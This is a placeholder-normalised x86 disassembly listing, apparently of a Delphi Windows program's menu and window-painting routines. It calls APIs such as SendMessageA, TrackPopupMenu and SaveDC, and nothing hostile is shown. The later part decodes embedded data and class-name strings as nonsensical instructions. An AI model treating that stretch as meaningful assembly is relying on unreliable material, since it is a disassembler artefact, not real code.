xor eax eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_408928
mov eax [ ebp + 0x10 ]
call sub_40886c
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_45d7c8
push ebx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
call sub_445e0c
test eax eax
je r-xdata
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_45d7a4
mov [ ebx + 0x41 ] 0x1
sub_45d7f0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4032d8
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_45d7a4
mov [ ebx + 0x41 ] 0x1
sub_45d87c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_45d378
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax edi
call sub_45d200
mov ebx eax
test esi esi
jne r-xdata
test bl bl
je r-xdata
push 0x0
push 0x0
push 0xb015
mov eax [ edi + 0x38 ]
push eax
call SendMessageA
mov eax [ edi + 0x38 ]
push eax
call DrawMenuBar
sub_45d90c
push ebx
push esi
mov ebx eax
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x38 ]
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb015
push eax
call SendMessageA
sub_45d948
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45d972
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45d994
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x30 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45dec7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi ]
cmp eax 0x111
jg r-xdata
sub eax 0x117
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x2b
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
inc ebx
xor edi edi
mov [ ebp - 0xd ] 0x0
test [ esi + 0x6 ] 0x10
je r-xdata
dec eax
je r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
dec eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45dece
lea eax [ ebp - 0x30 ]
call sub_403eb8
retn
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x27
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418700
mov edx [ esi + 0x4 ]
call sub_45cd40
test al al
jne r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_469e1c
jmp r-xdata
inc ebx
xor edi edi
inc ebx
xor edi edi
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418700
mov dx [ esi + 0x4 ]
call sub_45cd24
test al al
jne r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_424c18
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_45dcfa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_45dcdd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_425300
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_42517c
mov eax [ ebp - 0x24 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x24 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_45e16c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45dce4
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_425300
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
movzx eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov edx esi
mov eax [ ebp - 0x2c ]
call sub_45d584
jmp r-xdata
mov edx [ esi + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0x2c ]
call sub_45cc84
test eax eax
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418700
mov edx [ ebp - 0x24 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_45cc84
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call GetWindowDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_45de3d
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_424c18
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_45de18
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x1c ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_45ddfb
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
call sub_425300
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_42517c
mov eax [ ebp - 0x28 ]
add eax 0x10
push eax
mov eax [ ebp - 0x28 ]
lea ecx [ eax + 0xc ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45de02
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_425300
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x58 ]
call sub_446090
mov edx [ ebp - 0x30 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_469e1c
jmp r-xdata
mov [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
movzx edx [ esi + 0x4 ]
push edx
push eax
call GetSubMenu
mov [ ebp - 0x8 ] eax
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418700
mov edx [ ebp - 0x28 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_45cc84
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418700
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
mov cl 0x1
call sub_45cc84
mov [ ebp - 0xc ] eax
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418700
mov eax [ eax + 0x34 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0xd ] 0x1
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418700
mov cl [ ebp - 0xd ]
mov edx [ ebp - 0x8 ]
call sub_45cc84
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418700
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x2c ]
mov edx [ eax ]
call [ edx + 0x34 ]
cmp eax [ esi + 0x8 ]
je r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418700
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0x8 ]
mov cl 0x1
call sub_45ccb4
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418700
mov edx [ eax ]
call [ edx + 0x34 ]
mov edx [ ebp - 0x20 ]
cmp eax [ edx + 0xc ]
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov edx [ edx + 0x6c ]
test edx edx
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418700
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
xor ecx ecx
call sub_45ccb4
test eax eax
jne r-xdata
mov ecx [ rw-data ]
test [ edx + 0x228 ] 0x8
je r-xdata
mov eax [ rw-data ]
mov eax [ edx + 0x158 ]
mov edx [ rw-data ]
mov edx [ edx ]
xchg edx eax
call sub_469ac0
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov ecx eax
mov eax 0x8
xchg edx eax
call sub_469b28
jmp r-xdata
sub_45de1f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call ReleaseDC
retn
sub_45ded8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_4185a4
pop esi
pop ebx
retn
push ebx
push sub_45d948
call sub_421e98
mov [ ebx + 0x10 ] eax
sub_45df1c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_45ca9c
mov [ esi + 0x58 ] 0xffffffff
mov [ esi + 0x5c ] 0xffffffff
mov eax [ esi + 0x34 ]
mov [ eax + 0x8c ] esi
mov edx [ esi ]
mov edx [ edx + 0x3c ]
mov [ eax + 0x88 ] edx
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x38 ] eax
mov [ esi + 0x61 ] 0x1
mov edx esi
mov eax [ rw-data ]
call sub_45ded8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_45df90
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_45df00
mov edx ebx
and dl 0xfc
mov eax esi
call sub_45cb38
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_45dfe8
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0x41 ] 0x0
je r-xdata
lea eax [ ebx + 0x58 ]
call sub_458e34
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov dl [ eax + 0x34 ]
mov eax ebx
call sub_45d7a4
mov [ ebx + 0x41 ] 0x1
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_45d7a4
mov [ ebx + 0x41 ] 0x1
jmp r-xdata
sub_45e030
push esi
xor edx edx
mov ecx [ rw-data ]
cmp [ ecx + 0xd ] 0x0
je r-xdata
mov eax edx
pop esi
retn
cmp [ eax + 0x41 ] 0x0
je r-xdata
cmp [ eax + 0x30 ] 0x1
sete dl
add eax 0x58
call sub_458e34
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46866c
mov edx eax
jmp r-xdata
mov si 0xffc8
call sub_403324
mov edx eax
jmp r-xdata
sub_45e07c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov ecx esp
mov edx edi
mov eax esi
call sub_417088
mov eax [ esp ]
mov [ ebx + 0x58 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x5c ] eax
mov eax ebx
call sub_45dfe8
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_45c3f0
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_45c8ec
mov eax [ ebx + 0x34 ]
call sub_459c94
mov eax ebx
call sub_45d294
mov eax ebx
call sub_45e030
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 2 + rw-data ]
xor edx edx
mov dl [ ebx + 0x60 ]
mov bp [ eax + edx * 2 ]
xor eax eax
mov al [ ebx + 0x68 ]
or bp [ eax * 2 + rw-data ]
movzx ebp bp
xor eax eax
mov al [ ebx + 0x69 ]
shl eax 0xa
or ebp eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
push eax
push 0x0
push edi
push esi
push ebp
mov eax [ ebx + 0x34 ]
call sub_459dc4
push eax
call TrackPopupMenu
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_45e130
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_418700
xor edx edx
mov [ eax ] edx
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_418700
cmp ebp [ eax ]
jne r-xdata
sub_45e16c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x15 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov bl 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jg r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_424a38
mov edx 0xff000007
mov eax [ edi + 0xc ]
call sub_42426c
test [ ebp + 0x8 ] 0x80
je r-xdata
mov edx 0xff00000d
mov eax [ edi + 0x14 ]
call sub_424a38
mov edx 0xff00000e
mov eax [ edi + 0xc ]
call sub_42426c
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xfff2
call sub_403324
mov edx [ r-xdata ]
call sub_4032b4
mov [ ebp - 0x5 ] al
test [ ebp + 0x8 ] 0x1
je r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_424a38
mov edx 0xff000011
mov eax [ edi + 0xc ]
call sub_42426c
jmp r-xdata
mov ax [ ebp + 0x8 ]
push eax
mov al [ ebp - 0x5 ]
push eax
lea ecx [ ebp - 0x15 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test bl bl
jne r-xdata
sub_45e254
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_403f0c
mov ebx 0x1
jmp r-xdata
mov eax [ esi ]
call sub_404178
cmp ebx eax
jle r-xdata
mov eax [ esi ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
mov ecx eax
and ecx 0xff
bt [ edx ] ecx
jae r-xdata
pop esi
pop ebx
retn
cmp al 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax esi
mov ecx 0x1
mov edx ebx
call sub_404418
cmp ebx 0x1
jle r-xdata
mov eax [ esi ]
call sub_404178
sub eax ebx
cmp eax 0x2
jl r-xdata
mov eax [ esi ]
cmp [ eax + ebx - 0x2 ] 0x28
jne r-xdata
mov eax [ esi ]
cmp [ eax + ebx + 0x1 ] 0x29
jne r-xdata
mov edx ebx
dec edx
mov eax esi
mov ecx 0x4
call sub_404418
jmp r-xdata
sub_45e2e8
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax ebp
call sub_403eb8
mov ebx 0x1
mov eax esi
call sub_404178
mov edi eax
cmp edi ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ eax ] edx
jae r-xdata
cmp [ esi + ebx - 0x1 ] 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
cmp edi ebx
jge r-xdata
mov eax edi
sub eax ebx
dec eax
jl r-xdata
inc ebx
cmp [ esi + ebx - 0x1 ] 0x26
je r-xdata
mov eax ebp
mov dl [ esi + ebx - 0x1 ]
call sub_4040a0
sub_45e34c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45e3a5
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_45e254
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_45e254
mov eax [ ebp - 0x8 ]
pop edx
call sub_407f70
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e3ac
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403edc
retn
sub_45e3b4
adc al [ eax ]
add [ eax ] al
enter 0x48bd 0x0
xor cl al
dec eax
add ah al
mov ebp 0xc0d80048
dec eax
add al al
mov ebp 0xc0740048
dec eax
add [ ebp + edi * 4 - 0x3f47ffb8 ] bh
dec eax
add [ eax - 0x1fffb743 ] bh
retn
sub_45e3f0
lodsb [ esi ]
mov ebp 0xc1c80048
dec eax
add [ eax + 0x740048bd ] ch
les ecx [ eax ]
movsb [ edi ] [ esi ]
mov ebp 0xc4700048
dec eax
add [ eax + 0x740048bd ] ah
ror [ eax ] 0x9c
mov ebp 0xc42c0048
dec eax
add [ eax - 0x17ffb743 ] bl
retn
sub_45e431
mov ebp 0xc1840048
dec eax
add [ eax - 0x67ffb743 ] cl
ror [ eax ] 0x84
mov ebp 0xc1e40048
dec eax
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_45e4ac
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e4b3
retn
mov eax [ rw-data ]
call sub_403128
mov eax [ rw-data ]
call sub_403128
mov eax [ rw-data ]
call sub_403128
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_40496c
mov eax rw-data
call sub_403eb8
sub_45e4b8
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_45e3b4
call sub_403c64
mov eax [ r-xdata ]
call sub_417d34
mov eax [ r-xdata ]
call sub_417dd4
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417d80
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417d80
mov eax [ r-xdata ]
call sub_417c78
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42bc7c
mov [ rw-data ] eax
sub_45e710
mov eax 0xcc004611
adc [ esi ] eax
add [ eax ] al
add [ eax ] al
push es
add [ 0x676e6152 ] al
add [ gs : eax ] dl
inc eax
add [ edi ] bl
add [ eax ] al
[ edi ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ esi ] al
push ebx
insd
outsd
outsd
je r-xdata
add [ eax ] al
[ 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
cmp al 0x10
inc eax
add [ eax ] dh
add [ eax ] al
[ ecx + edx ]
add [ ebx + esi + 0x40 ] bh
add ah bh
or eax 0x33840042
inc eax
add [ eax - 0x2d ] dl
inc esp
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ esp + edx + 0x46 ] bh
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah dh
out 0x45 eax
add [ eax ] cl
ja r-xdata
push esi
jb r-xdata
outsd
insb
nop
pushfd
jmp 0x144ce9e3
add al [ ebp ]
sbb bl cl
inc esp
add [ ecx * 4 - 0x4f5fffbf ] dl
inc esp
dec esi
outsd
jb r-xdata
add [ ebx ] al
or al 0x54
inc edx
outsd
jb r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
add al dh
popad
insb
or esi [ edi + 0x73 ]
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
or esi [ fs : edi + 0x73 ]
dec ebp
popad
js r-xdata
shl ecx 0x2
int 0xda
push edx
rcl [ ecx ] 0x1
sahf
cmpsb [ esi ] [ edi ]
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4605da82
outsd
jb r-xdata
jb r-xdata
add [ eax ] al
0x10030045 0x4654
mov bh 0x44
add [ ebp + ecx * 4 + 0x14d40044 ] dl
push esp
test [ eax + eax - 0x34 ] al
insd
imul edi [ edx + 0x65 ] 0x6f460564
jb r-xdata
add [ ebx ] al
add [ eax ] al
add [ eax - 0x15 ] bl
inc ebp
add [ edx ] cl
imul edx [ ebx + 0x79 ] 0x6d657473
dec ebp
jae r-xdata
or [ ecx + 0x4f ] cl
je r-xdata
inc edx
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
add [ esp + edx ] al
inc esi
add [ esi + edi * 8 ] al
inc esp
add [ eax ] ah
add eax [ ebp ]
insb
add al [ ebp ]
enter 0x4482 0x0
cmp al 0x44
add [ eax - 0x47ffbb08 ] ah
cmc
inc esp
add [ eax ] dl
add [ eax + eax + 0x14 ] 0x82
inc esp
add [ eax - 0x4e ] dh
inc esp
add [ edx + esi * 4 - 0x7283ffbc ] bl
inc esp
add [ ebx + eax * 4 - 0x70f7ffbc ] cl
inc esp
add [ eax - 0x6bffbb72 ] al
xchg ecx eax
inc esp
add [ eax - 0x70 ] al
inc esp
add ah ch
rol [ eax + eax + 0x20 ] 0x1
mov bl 0x44
add [ esi + esi * 8 ] cl
inc esp
add al cl
test [ eax + eax - 0x3c ] 0xf1
inc esp
add [ esi + esi * 8 + 0x1b340044 ] ch
inc esi
add [ eax ] cl
adc eax 0xcc780046
inc esp
add [ eax + 0x60004614 ] bh
leave
inc esp
add al cl
adc al 0x46
add [ eax ] dl
int 0x44
add [ ecx * 8 - 0x3433ffbc ] dl
inc esp
add [ ebx + ecx * 8 + 0x44 ] dh
add ah ch
test [ eax + eax - 0x44 ] 0xc00044d5
or [ ebp ] eax
push 0x580044f4
test [ eax + eax + 0x28 ] 0xd8004615
pop ss
inc esi
add [ edx + ebx ] cl
inc esi
add [ esi ] al
add [ 0x15011400 ] al
add [ eax + esi * 4 ] edi
in al dx
inc eax
call [ eax ]
sbb al [ esi ]
in al dx
sbb al [ esi ]
adc [ ebx ] bl
inc esi
add [ ebx + ebx + 0x19e80046 ] ah
inc esi
add [ eax + 0x15 ] cl
inc esi
add [ esp + edx * 2 ] dl
push ebx
arpl [ edx + 0x6f ] si
insb
insb
imul ebp [ esi + 0x67 ] 0x436e6957
outsd
outsb
je r-xdata
jae r-xdata
or ah [ edx + 0x69 ]
dec ebp
bound ebp [ ecx + 0x4d ]
imul ebp [ esi + 0x69 ] 0x657a696d
dec [ ebp - 0x14f3ffc0 ]
add bh bh
insd
and al 0x11
inc eax
add [ ecx ] al
inc ebp
add [ ebx ] al
or dl [ esi + eax * 2 + 0x6f ]
jb r-xdata
lea eax [ eax ]
or al 0xeb
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ edx + ebp * 8 ] dl
inc ebp
add [ 0x6d726f46 ] al
jae r-xdata
or [ edx + esi * 2 + 0x61 ] dl
arpl [ ebx + 0x69 ] bp
outsb
add [ bx + si ] dl
inc eax
add [ eax + eax ] bl
add bh bh
fcom [ ecx ]
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x8d656c62
inc eax
add al bh
out 0x45 eax
add [ ebx ] al
or al 0x54
push edi
imul ebp [ esi + 0x64 ] 0x7453776f
popad
je r-xdata
ror [ eax + 0x45e8 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
jmp r-xdata
dec edi
insd
imul edi [ edx + 0x65 ] 0x48696206
outsb
jne r-xdata
push ebx
je r-xdata
outsd
jb r-xdata
inc eax
add [ ebx + ebp * 8 + 0x45 ] bl
add [ ebx ] al
or edx [ edx + eax * 2 + 0x6f ]
jb r-xdata
add eax 0x14000000
0x62060045 0x4e73
inc eax
add [ eax + 0xf0045ea ] ch
or eax 0x73654449
imul esp [ edi + 0x6e ] 0x6f487265
outsd
imul edx eax 0x6c
inc ecx
add [ ecx ] al
movsd [ edi ] [ esi ]
sbb eax 0x2bea1e43
out 0x4d eax
mov [ 0xfffffffffd45cc30 ] eax
das
mov cl 0xec
add eax 0x6d726f46
jae r-xdata
add [ esp + eax * 4 + 0x44 ] dl
add ah cl
push cs
jo r-xdata
mov eax eax
lodsb [ esi ]
jmp r-xdata
inc esi
outsd
jb r-xdata
popad
js r-xdata
bound ebp [ ecx + 0x4d ]
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] cl
jmp r-xdata
push eax
outsd
jae r-xdata
jb r-xdata
insb
inc esi
invd
dec ecx
dec edi
add bh bh
dec [ ebx + 0x45eadcc0 ]
add [ edi ] cl
outsd
push ebx
arpl [ edx + 0x65 ] si
outsb
inc ebx
outsb
add [ eax ] al
add eax [ eax ]
add [ eax ] al
pop esp
in al dx
inc ebp
inc esp
popa
je r-xdata
insb
jns r-xdata
jae r-xdata
add [ eax ] eax
add [ eax ] al
jo r-xdata
je r-xdata
inc edx
arpl [ edi + 0x6e ] bp
or ah [ ebp + ebp * 2 + 0x4d ]
insd
push eax
jo r-xdata
jb r-xdata
je r-xdata
je r-xdata
add [ ecx ] cl
insd
inc esp
jae r-xdata
add [ eax ] al
add [ esp + ebp * 8 + 0x45 ] bl
je r-xdata
adc [ eax + 0x6f ] esi
jo r-xdata
pshufw mm5 [ edi + 0x44 ] 0x65
jae r-xdata
jo r-xdata
inc esp
dec ecx
inc ebx
push 0x9646c69
jae r-xdata
shr [ ebx + ebp * 8 + 0xc060045 ] 0x54
inc esi
outsd
dec ebp
popad
imul ebp [ esi + 0x46 ] 0x436d726f
outsb
je r-xdata
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ edi ] al
add [ eax ] al
add al al
jmp r-xdata
jb r-xdata
push es
add eax 0x6d726f46
jae r-xdata
nop
insd
popad
jb r-xdata
adc [ eax + 0x6f ] dh
jo r-xdata
inc esi
outsd
jb r-xdata
jae r-xdata
add ecx [ edi ]
push esp
imul edi [ edx + 0x65 ] 0x796c6e4f
inc esp
popa
inc esp
